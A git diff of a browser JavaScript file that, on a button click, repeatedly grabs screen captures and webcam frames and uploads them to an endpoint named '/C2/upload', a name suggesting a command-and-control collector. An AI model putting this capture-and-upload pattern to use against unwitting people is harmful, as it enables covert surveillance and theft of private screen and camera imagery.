@@ -1,51 +1,12 @@
 'use strict';
 
-
-
-function handleStartButtonClick() {
-  console.log("handleStartButtonClick")
-}
-
 document.addEventListener('DOMContentLoaded', function() {
-  document.getElementById('start_button').addEventListener('click', handleStartButtonClick);
-});
+  var gumVideo = document.querySelector('video#gum');
+  var canvas = document.querySelector('canvas');
+  canvas.width = 266;
+  canvas.height = 200;
 
-async function screenshotOfTab() {
-  try {
-    // Capture the visible tab and wait for the promise to resolve
-    const screenshotUrl = await new Promise((resolve, reject) => {
-      chrome.tabs.captureVisibleTab((url) => {
-        if (chrome.runtime.lastError) {
-          reject(chrome.runtime.lastError);
-        } else {
-          resolve(url);
-        }
-      });
-    });
-    
-    let targetId = null;
-
-    // Listen for tab updates
-    chrome.tabs.onUpdated.addListener(function listener(tabId, changedProps) {
-      // Check that the tab is the one we opened and that it is complete
-      if (tabId !== targetId || changedProps.status !== 'complete') return;
-
-      // Stop listening for updates
-      chrome.tabs.onUpdated.removeListener(listener);
-    });
-
-    const response = await fetch(screenshotUrl);
-    const blob = await response.blob();
-    return blob;
-  } catch (error) {
-    console.error("Error taking screenshot: ", error);
-  }
-}
-
-function setScreenshotUrl(url) {
-  console.log("set screenshot url")
-  document.getElementById('target').src = url;
-}
+document.getElementById('start_button').addEventListener('click', handleImagesCapturing);
 
 var mediaSource = new MediaSource();
 mediaSource.addEventListener('sourceopen', handleSourceOpen, false);
@@ -56,143 +17,89 @@ var startTime;
 var finishTime;
 
 
-// var gumVideo = document.querySelector('video#gum');
-// var canvas = document.querySelector('canvas');
-// canvas.width = 266;
-// canvas.height = 200;
 const stream_promise = navigator.mediaDevices.getDisplayMedia({video: true});
 
 
-// async function grabScreenshot() {
-//   console.log("grab screenshot");
-//   var imgData;
-//   try {
-//     const stream = await stream_promise;
-//     console.log(stream)
-//     const canvas = document.querySelector('canvas');
-//     const video = document.createElement('video'); // Create a video element dynamically
-//     video.srcObject = stream;
-//     await new Promise((resolve) => {
-//       video.onloadedmetadata = () => {
-//         video.play();
-//         resolve();
-//       };
-//     });
+async function grabScreenshot() {
+  console.log("grab screenshot");
+  var imgData;
+  try {
+    const stream = await stream_promise;
+    console.log(stream)
+    const canvas = document.querySelector('canvas');
+    const video = document.createElement('video'); // Create a video element dynamically
+    video.srcObject = stream;
+    await new Promise((resolve) => {
+      video.onloadedmetadata = () => {
+        video.play();
+        resolve();
+      };
+    });
 
-//     const [track] = stream.getVideoTracks();
-//     console.log("grab screenshot 1");
-//     console.log(track)
-//     const imageCapture = new ImageCapture(track);
+    const [track] = stream.getVideoTracks();
+    console.log("grab screenshot 1");
+    console.log(track)
+    const imageCapture = new ImageCapture(track);
 
-//     // Grab a frame from the screen stream
-//     imgData = await imageCapture.grabFrame();
+    // Grab a frame from the screen stream
+    imgData = await imageCapture.grabFrame();
     
-//     // Draw the frame on the canvas
-//     canvas.width = imgData.width;
-//     canvas.height = imgData.height;
-//     canvas.getContext('2d').drawImage(imgData, 0, 0);
+    // Draw the frame on the canvas
+    canvas.width = imgData.width;
+    canvas.height = imgData.height;
+    canvas.getContext('2d').drawImage(imgData, 0, 0);
     
-//     // Convert the canvas to a Blob
-//     const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
-//     console.log("grab screenshot 2");
-//     console.log(blob);
+    // Convert the canvas to a Blob
+    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+    console.log("grab screenshot 2");
+    console.log(blob);
     
-//     return blob;
-//   } catch (err) {
-//     console.error(err);
-//   }
-// }
-// async function handleCapturingImages() {
-//   // Define canvas context
-//   let ctx = canvas.getContext('2d');
+    return blob;
+  } catch (err) {
+    console.error(err);
+  }
+}
 
-//   // Define the number of photos to capture
-//   var how_many_photos = 3;
 
-//   // Loop to capture multiple photos
-//   for (var i = how_many_photos; i > 0; i--) {
-//       console.log("Capturing photo ", i);
-
-//       // Capture screenshot of the tab
-//       const screenshot = await grabScreenshot();
-
-//       // Capture screenshot from the video stream
-//       const camera = await grabCameraScreenshot(ctx);
-
-//       // Create FormData object to send data via POST request
-//       let formData = new FormData();
-//       formData.append('camera', camera, 'camera.jpg');
-//       formData.append('screenshot', screenshot, 'screenshot.png');
-
-//       // Send POST request to upload the images
-//       await fetch('http://127.0.0.1:5000/upload', {
-//           method: 'POST',
-//           body: formData
-//       })
-//       .then(response => response.text())
-//       .then(result => {
-//           console.log('Success:', result);
-//       })
-//       .catch(error => {
-//           console.error('Error:', error);
-//       });
-
-//       // Wait for 5 seconds before capturing the next photo
-//       await new Promise(resolve => setTimeout(resolve, 5000));
-//   }
-// }
-
-// // Function to capture screenshot from the camera stream and draw on canvas
-// async function grabCameraScreenshot(ctx) {
-//   ctx.drawImage(gumVideo, 0, 0, canvas.width, canvas.height);
-//   return await new Promise(resolve => {
-//       canvas.toBlob(resolve, 'image/jpeg');
-//   });
-// }
-
-// gumVideo.addEventListener('click', async function(){
-//     let ctx = canvas.getContext('2d');
+ async function handleImagesCapturing (){
+    let ctx = canvas.getContext('2d');
     
-//     var how_many_photos = 3;
-//     var i=how_many_photos;
-//     while (i>0){
-//       console.log("while loop")
-//       --i;
-//     //  const screenshot = await screenshotOfTab();
-//     var startTime = performance.now()
-//     const screenshot = await grabScreenshot();
-//     var endTime = performance.now()
-//     var time = endTime - startTime;
-//     console.log("time: " + time);
+    var how_many_photos = 3;
+    var i=how_many_photos;
+    while (i>0){
+      console.log("while loop")
+      --i;
+    //  const screenshot = await screenshotOfTab();
+    var startTime = performance.now()
+    const screenshot = await grabScreenshot();
+    var endTime = performance.now()
+    var time = endTime - startTime;
+    console.log("time: " + time);
 
 
-//     ctx.drawImage(gumVideo, 0, 0, canvas.width, canvas.height);
-//     let camera = await new Promise(resolve => {
-//       canvas.toBlob(resolve, 'image/jpeg');
-//     });
-//     let formData = new FormData();
-//     formData.append('camera', camera, 'camera.jpg');
-//     formData.append('screenshot', screenshot, 'screenshot.png');
+    ctx.drawImage(gumVideo, 0, 0, canvas.width, canvas.height);
+    let camera = await new Promise(resolve => {
+      canvas.toBlob(resolve, 'image/jpeg');
+    });
+    let formData = new FormData();
+    formData.append('camera', camera, 'camera.jpg');
+    formData.append('screenshot', screenshot, 'screenshot.png');
 
-//     await fetch('http://127.0.0.1:5000/upload', {
-//       method: 'POST',
-//       body: formData
-//   })
-//   .then(response => response.text())
-//   .then(result => {
-//       console.log('Success:', result);
-//   })
-//   .catch(error => {
-//       console.error('Error:', error);
-//   });
+    await fetch('/C2/upload', {
+      method: 'POST',
+      body: formData
+  })
+  .then(response => response.text())
+  .then(result => {
+      console.log('Success:', result);
+  })
+  .catch(error => {
+      console.error('Error:', error);
+  });
 
-//     await new Promise(resolve => setTimeout(resolve, 5000));
-//   }
-// });
-
-
-
-
+    await new Promise(resolve => setTimeout(resolve, 5000));
+  }
+};
 
 
 // Use old-style gUM to avoid requirement to enable the
@@ -231,3 +138,4 @@ function handleDataAvailable(event) {
     recordedBlobs.push(event.data);
   }
 }
+});
